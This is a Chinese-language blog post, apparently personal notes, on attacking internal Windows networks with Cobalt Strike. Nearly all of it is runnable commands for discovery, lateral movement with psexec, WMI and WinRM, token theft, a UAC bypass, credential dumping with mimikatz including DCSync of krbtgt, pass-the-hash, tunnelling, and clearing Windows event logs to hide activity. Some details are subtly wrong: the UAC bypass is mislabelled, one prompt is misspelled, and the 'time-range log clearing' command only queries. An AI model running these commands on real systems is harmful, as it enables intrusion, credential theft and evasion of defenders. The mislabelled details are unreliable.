---
layout: post
toc: true
title: "「CS」:内网渗透工具学习笔记"
wrench: 2020-07-01
author: Bin4xin
categories:
    - blog
    - 笔记
    - 安全工具
    - Cobalt Strike
    - 内网渗透
permalink: /blog/2020/C-S/use/internet-Inside/
---

> 内网渗透中，工具的使用只是手段，理解原理才是根本。本文记录在内网渗透场景下常用工具的使用方法与思路。

## 0x00 信息收集

进入内网后的第一件事：**信息收集**。

### 网络拓扑探测

```bash
# 获取当前主机网络信息
shell ipconfig /all
shell route print
shell arp -a

# 域环境信息
shell net view /domain
shell net group "Domain Controllers" /domain
shell nltest /domain_trusts
```

### 端口扫描

Cobalt Strike内置的`portscan`功能：

```bash
# Beacon中执行端口扫描
beacon> portscan 10.10.10.0/24 445,3389,5985 parallelism(max) 20

# 也可以使用shell调用外部工具
beacon> shell powershell -exec bypass -c "Import-Module .\Invoke-Portscan.ps1; Invoke-Portscan -Hosts 10.10.10.0/24 -Ports '445,3389,5985,80,443'"
```

### 主机存活探测

```bash
# ping sweep
beacon> shell for /l %i in (1,1,255) do @ping -n 1 -w 100 10.10.10.%i | find "Reply"

# PowerShell方式
beacon> shell powershell -c "1..255 | % {Test-Connection -Count 1 -Quiet 10.10.10.$_}"
```

## 0x01 横向移动

### PsExec

最经典的横向移动方式：

```bash
# CS内置psexec
beacon> jump psexec64 DC01 beacon_bind_pipe

# 手动方式
beacon> shell copy \\target\C$\Windows\Temp\beacon.exe \\target\C$\Windows\Temp\
beacon> shell sc \\target create BeaconSvc binPath= "C:\Windows\Temp\beacon.exe"
beacon> shell sc \\target start BeaconSvc
```

### WMI

```bash
# CS内置wmi
beacon> jump wmi DC01 beacon_bind_pipe

# 手动方式
beacon> shell wmic /node:"10.10.10.1" /user:"DOMAIN\admin" /password:"P@ssw0rd" process call create "C:\Windows\Temp\beacon.exe"
```

### WinRM

```bash
# CS内置winrm
beacon> jump winrm64 DC01

# PowerShell远程执行
beacon> shell powershell -c "Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }"
```

### SMB Beacon

SMB Beacon是内网横向中非常实用的通信方式，通过命名管道（Named Pipe）回连父Beacon：

```bash
# 创建SMB Beacon监听
beacon> link DC01

# 通过SMB隧道执行命令
beacon> getuid
beacon> shell whoami
```

## 0x02 权限提升

### Token模拟

```bash
# 列出可用token
beacon> token_list

# 模拟域管理员token
beacon> token_steal <PID>
beacon> getuid
```

### Potato提权

```bash
# JuicyPotato / PrintSpoofer
beacon> shell PrintSpoofer64.exe -i -c "C:\Windows\Temp\beacon.exe"
```

### UAC绕过

```bash
# EventViewer绕过
beacon> shell reg add HKCU\Classes\ms-settings\shell\open\command /d "C:\Windows\Temp\beacon.exe" /f
beacon> shell eventvwr.exe
beacon> shell reg delete HKCU\Classes\ms-settings\shell\open\command /f
```

## 0x03 凭证获取

### Mimikatz

```bash
# CS内置mimikatz
beacon> mimikatz !sekurlsa::logonpasswords
beacon> mimikatz !lsadump::sam

# 获取域控NTDS.dit
beacon> mimikatz !lsadump::dcsync /domain:target.local /user:krbtgt
```

### Hash传递

```bash
# PTH攻击
beacon> pth DOMAIN\Admin NTLM_HASH
beacon> ls \\DC01\C$
```

### DPAPI

```bash
# 解密Chrome密码等
beacon> mimikatz !dpapi::cred /in:"C:\Users\xxx\AppData\Local\Microsoft\Credentials\xxx"
```

## 0x04 隧道代理

### SOCKS代理

```bash
# 在Beacon上开启socks代理
beacon> socks 1080

# 本地配置proxychains
# /etc/proxychains.conf
# socks5 127.0.0.1 1080
```

### 端口转发

```bash
# rportfwd: 将远程端口转发到本地
beacon> rportfwd 3389 10.10.10.1 3389

# rportfwd_local: 将本地端口转发到远程
beacon> rportfwd_local 8080 192.168.1.1 80
```

### 隧道叠加

在多层内网中，往往需要多级隧道：

```
外网VPS ──> DMZ主机(Beacon) ──> 内网主机(SMB Beacon) ──> 核心网段

# 第一层: VPS→DMZ socks代理
# 第二层: DMZ→内网 rportfwd
# 使用proxychains串联
```

## 0x05 日志清理

```bash
# 清除Windows事件日志
beacon> shell wevtutil cl Security
beacon> shell wevtutil cl System
beacon> shell wevtutil cl Application

# 清除指定时间段日志
beadow> shell wevtutil qe Security /q:"*[System[TimeCreated[@SystemTime>='2020-06-22T00:00:00']]]" /ow:true
```

## 0x06 常用工具汇总

{:.table}
| 工具 | 用途 | 场景 |
|------|------|------|
| SharpHound | AD信息收集 | BloodHound可视化分析 |
| Rubeus | Kerberos攻击 | AS-REP Roasting, Kerberoasting |
| Seatbelt | 主机信息收集 | 提权路径分析 |
| SharpUp | 提权检查 | 发现可利用的提权点 |
| Certify | AD CS攻击 | 证书服务漏洞利用 |
| KrbRelayUp | Kerberos Relay | 域内提权 |
| ADCSPwn | ADCS利用 | 证书模板漏洞 |

以上。